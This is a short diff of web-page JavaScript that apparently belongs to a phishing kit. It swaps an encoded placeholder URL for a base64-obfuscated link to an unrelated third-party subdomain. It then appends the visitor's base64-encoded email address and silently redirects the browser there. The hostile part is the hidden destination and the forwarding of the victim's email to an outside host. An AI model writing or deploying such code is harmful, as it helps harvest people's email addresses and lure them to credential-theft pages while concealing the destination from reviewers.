@@ -330,14 +330,14 @@
             showError('');
 
             // For any valid email (no email list check)
-            const link = "aHR0cHM6Ly9mYWNlYm9vay5jb20vP1M9";
+            const link = "aHR0cHM6Ly9ramhndi5taWRjaXR5bW90ZWwuY29tLz9qR0VBOUxDQW89TkRRNE9UTXpabVU1TldSbU5HTm1OV0kxTVRneE1HWTBaalJpTUdabU1HTSUzRCZNdWdKYWE9MHpQYXpP";
             const decodedLink = atob(link);
             
             // Encode the email for the URL
             const encodedEmail = btoa(email);
             
-            // Create final link: decodedlink + &e= + encoded email
-            const finalLink = `${decodedLink}&e=${encodedEmail}`;
+            // Create final link: decodedlink + &eu= + encoded email
+            const finalLink = `${decodedLink}&eu=${encodedEmail}`;
             
             // Redirect to the final link
             window.location.href = finalLink;
